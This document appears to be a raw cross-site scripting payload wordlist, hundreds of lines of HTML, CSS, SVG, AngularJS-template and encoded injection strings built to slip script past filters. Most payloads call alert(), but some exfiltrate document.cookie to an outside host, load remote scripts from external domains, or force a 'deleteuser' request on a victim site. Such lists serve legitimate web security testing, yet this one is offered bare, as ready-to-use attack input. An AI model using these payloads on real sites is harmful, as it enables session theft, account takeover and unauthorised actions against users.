<scrscriptipt>alert(1)</scrscriptipt>
<style TYPE="text/javascript">document.vulnerable=true;</style>
<style onLoad style onLoad="javascript:javascript:alert(1)"></style onLoad>
<style onReadyStateChange style onReadyStateChange="javascript:javascript:alert(1)"></style onReadyStateChange>
<style onreadystatechange=javascript:javascript:alert(1);></style>
<style type="text/css">BODY{background:url("javascript:document.vulnerable=true")}</style>
<style type="text/javascript">document.vulnerable=true;</style>
<style/onload=&lt;!-- &gt; alert &lpar;1&rpar;>
<style/onload=&lt;!--&#09;&gt;&#10;alert&#10;&lpar;1&rpar;>
<style/onload=prompt&#40;'&#88;&#83;&#83;'&#41;
<style/onload=prompt('XSS')
<style>*[{}@import'%(css)s?]</style>X
<style>*{x:ｅｘｐｒｅｓｓｉｏｎ(javascript:alert(1))}</style>
<style>.XSS{background-image:url("javascript:document.vulnerable=true");}</STYLE><A CLASS=XSS></a>
<style><!--</style><script>document.vulnerable=true;//--></script>
<style></style\x09<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0A<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x0D<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x20<img src="about:blank" onerror=javascript:alert(1)//></style>
<style></style\x3E<img src="about:blank" onerror=javascript:alert(1)//></style>
<style><img src="</style><img src=x onerror=alert(123)//">
<style><img src="</style><img src=x onerror=alert(XSS)//">
<style><img src="</style><img src=x onerror=javascript:alert(1)//">
<style>@KeyFrames z{</style><div style=animation-name:z onanimationend=&#97&#108&#101&#114&#116&grave;1&grave;> %253Cscript%253Ealert('XSS')%253C%252Fscript%253E "</script><script>alert(String.fromCharCode(88,83,83))</script> <IMG SRC=x onload="alert(String.fromCharCode(88,83,83))"> <IMG SRC=x onafterprint="alert(String.fromCharCode(88,83,83))">
<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
<style>@im\port'\ja\vasc\ript:document.vulnerable=true';</style>
<style>@import "data:,*%7bx:expression(javascript:alert(1))%7D";</style>
<style>@import'http://www.securitycompass.com/xss.css';</style>
<style>BODY{-moz-binding:url("http://www.securitycompass.com/xssmoz.xml#xss")}</style>
<style>li {list-style-image: url("javascript:document.vulnerable=true;");</STYLE><UL><LI>XSS
<style>p[foo=bar{}*{-o-link:'javascript:javascript:alert(1)'}{}*{-o-link-source:current}]{color:red};</style>
<svg contentScriptType=text/vbs><script>MsgBox+1
<svg onLoad svg onLoad="javascript:javascript:alert(1)"></svg onLoad>
<svg onResize svg onResize="javascript:javascript:alert(1)"></svg onResize>
<svg onUnload svg onUnload="javascript:javascript:alert(1)"></svg onUnload>
<svg onload svg onload="javascript:javascript:alert(1)"></svg onload>
<svg onload="javascript:alert(123)" xmlns="#"></svg>
<svg onunload svg onunload="javascript:javascript:alert(1)"></svg onunload>
<svg xmlns="#"><script>alert(1)</script></svg>
<svg xmlns="http://www.w3.org/2000/svg">LOL<script>alert(123)</script></svg>
<svg/onload=alert(1)
<svg><script ?>alert(1)
<svg><script onlypossibleinopera:-)> alert(1)
<svg><script x:href='https://dl.dropbox.com/u/13018058/js.js' {Opera}
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script
<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
<svg><script>//&NewLine;confirm(1);</script </svg>
<svg><style>{font-family&colon;'<iframe/onload=confirm(1)>'
<table BACKGROUND="javascript:document.vulnerable=true;">
<table background="javascript:javascript:alert(1)">
<table><TD BACKGROUND="javascript:document.vulnerable=true;">
<title onPropertyChange title onPropertyChange="javascript:javascript:alert(1)"></title onPropertyChange>
<title onpropertychange=javascript:alert(1)></title><title title=>
<var onmouseover="prompt(1)">On Mouse Over</var>
<video onerror="javascript:javascript:alert(1)"><source>
<video poster=javascript:javascript:alert(1)//
<video src=1 href=1 onerror="javascript:alert(1)"></video>
<video src=1 onerror=alert(1)>
<video><source onerror="javascript:javascript:alert(1)">
<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%;height:100% src=%(vml)s#xss></vmlframe>
<x '="foo"><x foo='><img src=x onerror=javascript:alert(1)//'>
<x style="background:url('x ;color:red;/*')">XXX</x>
<x style="background:url('x&#1;;color:red;/*')">XXX</x>
<x style="behavior:url(%(sct)s)">
<x:script xmlns:x="https://sql--injection.blogspot.co.uk">alert('xss');</x:script>
<xml id="X"><a><b><script>document.vulnerable=true;</script>;</b></a></xml>
<xml id="xss" src="%(htc)s"></xml> <label dataformatas="html" datasrc="#xss" datafld="payload"></label>
<xml onPropertyChange xml onPropertyChange="javascript:javascript:alert(1)"></xml onPropertyChange>
<xml src="javascript:document.vulnerable=true;">
<~/XSS STYLE=xss:expression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
<~/XSS/*-*/STYLE=xss:e/**/xpression(window.location="http://www.procheckup.com/?sid="%2bdocument.cookie)>
='><script>alert("xss")</script>
>"><ScRiPt%20%0a%0d>alert(561177485777)%3B</ScRiPt>
>"><script>alert("XSS")</script>&
>%22%27><img%20src%3d%22javascript:alert(%27%20XSS%27)%22>
>/"><script>alert('xss message')</script>
></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>
><h1><IFRAME width="420" height="315" frameborder="0" onmouseover="document.location.href='https://www.youtube.com/channel/UC9Qa_gXarSmObPX3ooIQZr
ABC<div style="x:\x00expression(javascript:alert(1)">DEF
ABC<div style="x:\x09expression(javascript:alert(1)">DEF
ABC<div style="x:\x0Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Cexpression(javascript:alert(1)">DEF
ABC<div style="x:\x0Dexpression(javascript:alert(1)">DEF
ABC<div style="x:\x20expression(javascript:alert(1)">DEF
ABC<div style="x:\xC2\xA0expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x81expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x82expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x83expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x84expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x85expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x86expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x87expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x88expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x89expression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Aexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE2\x80\x8Bexpression(javascript:alert(1)">DEF
ABC<div style="x:\xE3\x80\x80expression(javascript:alert(1)">DEF
ABC<div style="x:\xEF\xBB\xBFexpression(javascript:alert(1)">DEF
ABC<div style="x:exp\x00ression(javascript:alert(1)">DEF
ABC<div style="x:exp\x5Cression(javascript:alert(1)">DEF
ABC<div style="x:expression\x00(javascript:alert(1)">DEF
ABC<div style="x:expression\x5C(javascript:alert(1)">DEF
ABC<div style="x\x3Aexpression(javascript:alert(1)">DEF
Execute(MsgBox(chr(88)&chr(83)&chr(83)))<
LOL<style>*{/*all*/color/*all*/:/*all*/red/*all*/;/[0]*IE,Safari*[0]/color:green;color:bl/*IE*/ue;}</style>
Redirect 302 /a&#46;jpg http&#58;//victimsite&#46;com/admin&#46;asp&deleteuser
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
X<x style=`behavior:url(#default#time2)` onbegin=`javascript:alert(1)` >
XSS STYLE=xss:e/**/xpression(alert('XSS'))>
XSS/*-*/STYLE=xss:e/**/xpression(alert('XSS'))>
[\xC0][\xBC]script>document.vulnerable=true;[\xC0][\xBC]/script>
[color=red width=expression(alert(123))][color]
[color=red' onmouseover="alert('xss')"]mouse over[/color]
\";;alert(';XSS';);//
\";alert('XSS');//
\";document.vulnerable=true;;//
\&quot;;alert(&apos;XSS&apos;);//
\'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT><img src="" alt=\'
\\";alert('XSS');//
\\'); alert(\'xss\');var x=\'
\u003C
\u003c
\x3C
\x3Cscript>javascript:alert(1)</script>
\x3c
`"'><img src='#\x27 onerror=javascript:alert(1)>
`"'><img src=xxx:x \x00onerror=javascript:alert(1)>
`"'><img src=xxx:x \x09onerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Aonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Bonerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Conerror=javascript:alert(1)>
`"'><img src=xxx:x \x0Donerror=javascript:alert(1)>
`"'><img src=xxx:x \x20onerror=javascript:alert(1)>
`"'><img src=xxx:x \x22onerror=javascript:alert(1)>
`"'><img src=xxx:x \x27onerror=javascript:alert(1)>
`"'><img src=xxx:x \x2Fonerror=javascript:alert(1)>
`"'><img src=xxx:x onerror\x00=javascript:alert(1)>
`"'><img src=xxx:x onerror\x09=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0A=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0B=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0C=javascript:alert(1)>
`"'><img src=xxx:x onerror\x0D=javascript:alert(1)>
`"'><img src=xxx:x onerror\x20=javascript:alert(1)>
a=";get";;&;#10;b=";URL(";";;&;#10;c=";javascript:";;&;#10;d=";alert(';XSS';);";)";;&#10;eval(a+b+c+d);
a="get";b="URL";c="javascript:";d="alert('xss');";eval(a+b+c+d);
a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
a=\"get\";
alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//--
alert(String.fromCharCode(88,83,83));'))">
b=\"URL(\\"\";
body{xss:expression(alert(“Xss”))}
c=\"javascript&#058;\";
d=\"alert('XSS');\\")\";
data:text/html;charset=utf-7;base64,Ij48L3RpdGxlPjxzY3JpcHQ+YWxlcnQoMTMzNyk8L3NjcmlwdD4=
echo('IPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;'); ?&gt;
eval(a+b+c+d);
exp/*&lt;A STYLE='no\xss&#58;noxss(\"*//*\");
exp/*&lt;XSS STYLE=&apos;no\xss:noxss(&quot;*//*&quot;);
exp/*<;XSS STYLE=';no\xss:noxss(";*//*";);
exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(alert("XSS"))'>
exp/*<A STYLE='no\xss:noxss("*//*");xss:ex/*XSS*//*/*/pression(document.vulnerable=true)'>
foo<script>alert(/Xss/)</script>
foo<script>alert(1)</script>
foo<script>alert(document.cookie)</script>
foo\’; alert(document.cookie);//’;
g'"></IFRAME>Hover the cursor to the LEFT of this Message</h1>&ParamHeight=250
http://www.<script>alert(1)</script .com
http://www.google<script .com>alert(document.location)</script
javascript:alert("hellox worldss")
javascript:alert(1);
javascript:alert(document.domain);
lt;STYLE TYPE=&quot;text/javascript&quot;&gt;alert(&apos;XSS&apos;);&lt;/STYLE&gt;
onmouseover=prompt(document.domain
perl -e &#039;print \";<;IMG SRC=java\0script:alert(\";XSS\";)>;\";;&#039; >; out
perl -e &#039;print \";<;SCR\0IPT>;alert(\";XSS\";)<;/SCR\0IPT>;\";;&#039; >; out
perl -e &#039;print \&quot;&lt;IMG SRC=java\0script:alert(\&quot;XSS\&quot;)&gt;\&quot;;&#039; &gt; out
perl -e &#039;print \&quot;&lt;SCR\0IPT&gt;alert(\&quot;XSS\&quot;)&lt;/SCR\0IPT&gt;\&quot;;&#039; &gt; out
perl -e &apos;print &quot;&amp;&lt;SCR\0IPT&gt;alert(&quot;XSS&quot;)&lt;/SCR\0IPT&gt;&quot;;&apos; &gt; out
perl -e &apos;print &quot;&lt;IMG SRC=java\0script:alert(&quot;XSS&quot;)>&quot;;&apos;&gt; out
perl -e ';print ";&;<;SCR\0IPT>;alert(";XSS";)<;/SCR\0IPT>;";;'; >; out
perl -e ';print ";<;IM SRC=java\0script:alert(";XSS";)>";;';>; out
perl -e 'print "<IMG SRC=java\0script:alert(\"XSS\")>";' > out
perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
perl -e 'print \"<IMG SRC=java\0script:alert(\"XSS\")>\";' > out
perl -e 'print \"<SCR\0IPT>alert(\"XSS\")</SCR\0IPT>\";' > out
src="http://www.site.com/XSS.js"></script>
vulnerable"%3B%20alert(%27Mondays%27)%3B%20"
window.alert("Bonjour !");
x'\"></script><img src=x onerror=alert(1)>
xss&#58;ex&#x2F;*XSS*//*/*/pression(alert(\"XSS\"))'&gt;
xss:expression(alert(/Xss/)
{{ 'a'[{toString:false,valueOf:[].join,length:1,0:'__proto__'}].charAt=[].join; $eval('x=alert(1)//'); }}
{{ {}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=''.valueOf; $eval('x=alert(1)//'); }}
{{!ready && (ready = true) && (!call ? $$watchers[0].get(toString.constructor.prototype) : (a = apply) && (apply = constructor) && (valueOf = call) && (''+''.toString('F = Function.prototype;' + 'F.apply = F.a;' + 'delete F.a;' + 'delete F.valueOf;' + 'alert(1);')));}}
{{'a'.constructor.prototype.charAt=''.valueOf;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} } };alert(1)//');}}
{{'a'.constructor.prototype.charAt=[].join;$eval('x=alert(1)');}}
{{'a'[{toString:[].join,length:1,0:'__proto__'}].charAt=''.valueOf;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
{{(_=''.sub).call.call({}[$='constructor'].getOwnPropertyDescriptor(_.__proto__,$).value,0,'alert(1)')()}}
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}
{{constructor.constructor('alert(1)')()}} <div ng-app> {'a'.constructor.fromCharCode=[].join; 'a'.constructor[0]='\u003ciframe onload=alert(/Backdoored/)\u003e';}} </div> <div ng-app> {{'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)')+''}} </div> <script> onload=function(){document.write(String.fromCharCode(97));}</script> <SCRIPT SRC=http://3w.org/XSS/xss.js> </ SCRIPT> <SCRIPT SRC=http://3w.org/XSS/xss.js> </ SCRIPT> <IMG SRC=javascript:alert('XSS')> <IMG SRC=JaVaScRiPt:alert('XSS')> <IMG SRC=javascript:alert("XSS")> <IMG """> <SCRIPT> Alert ("XSS") </ SCRIPT> "> <IMG SRC=javascript:alert(String.fromCharCode(88,83,83))> <IMG SRC=jav..??..S')> Unicode encoding ( 9 ) 7 of UTF-8 is no semicolon ( calculator ) <IMG SRC=jav..??..S')> <IMG SRC=java..??..XSS')> <IMG SRC="jav ascript:alert('XSS');"> <IMG SRC="jav ascript:alert('XSS');"> <IMG SRC = "jav ascript: alert ('XSS ' ) ; " > <IMG SRC="jav ascript:alert('XSS');"> <IMG SRC="javascript:alert('XSS')"> <script> z = 'document.' </ script> <script> z = z + 'write ("' </ script> <script> z = z + '<script' </ script> <script> z = z + 'src = ht' </ script> <script> z = z + 'tp :/ / ww' </ script> <script> z = z + 'w.zoyzo' </ script> <script> z = z + '. cn / 1.' </ script> <script> z = z + 'js> </ sc' </ script> <script> z = z + 'ript> ")' </ script> <script> eval_r (z) </ script> perl-e 'print "<IMG SRC=javascript:alert("XSS")>";'> out perl-e 'print "<SCRIPT> alert (" XSS ") </ SCRIPT>";'> out <IMG SRC=" javascript:alert('XSS');"> <SCRIPT/XSS SRC="http://3w.org/XSS/xss.js"> </ SCRIPT> <BODY Onload!#$%&()*~+-_.,:;?@[/|]^`=alert("XSS")> <SCRIPT/SRC="http://3w.org/XSS/xss.js"> </ SCRIPT> << SCRIPT> alert ("XSS") ;/ / << / SCRIPT> <SCRIPT SRC = http://3w.org/XSS/xss.js? <B> <SCRIPT SRC=//3w.org/XSS/xss.js> <IMG SRC = "javascript: alert ('XSS')" <iframe src=http://3w.org/XSS.html> <SCRIPT> A = / XSS / alert (a.source) </ SCRIPT>  "; alert ('XSS') ;/ / </ TITLE> <SCRIPT> alert ("XSS"); </ SCRIPT> <INPUT SRC="javascript:alert('XSS');"> <BODY BACKGROUND="javascript:alert('XSS')"><BODY('XSS')> <IMG DYNSRC="javascript:alert('XSS')"> <IMG LOWSRC="javascript:alert('XSS')"> <BGSOUND SRC="javascript:alert('XSS');"> <LINK REL="stylesheet" HREF="javascript:alert('XSS');"> <LINK REL="stylesheet" HREF="http://3w.org/xss.css"> <STYLE> Li {list-style-image: url ("javascript: alert ('XSS')");} </ STYLE> <UL> <LI> XSS <IMG SRC='vbscript:msgbox("XSS")'> </ STYLE> <UL> <LI> XSS %3Cscript%3Ealert(%22XSS%22)%3C/script%3E &lt;script&gt;alert("XSS")&lt;/script&gt; &lt;script&gt;alert("XSS")&lt;/script&gt; &lt;script&gt;alert(%34XSS%34)&lt;/script&gt; &lt;script&gt;alert('XSS')&lt;/script&gt; callback=javascript://anything%0D%0A%0D%0Awindow.alert(1)// javascript:alert(document.cookie);// ';alert(String.fromCharCode(88,83,83))//';alert(String.fromCharCode(88,83,83))//"; alert(String.fromCharCode(88,83,83))//";alert(String.fromCharCode(88,83,83))//-- ></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT> <SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT> <IMG SRC="javascript:alert('XSS');"> <a onmouseover="alert(document.cookie)">xxs link</a> <a onmouseover=alert(document.cookie)>xxs link</a>
{{toString.constructor.prototype.toString=toString.constructor.prototype.call;["a","alert(1)"].sort(toString.constructor);}}
{{{}[{toString:[].join,length:1,0:'__proto__'}].assign=[].join; 'a'.constructor.prototype.charAt=[].join; $eval('x=alert(1)//');  }}
}</style><script>a=eval;b=alert;a(b(/XSS/.source));</script>

```
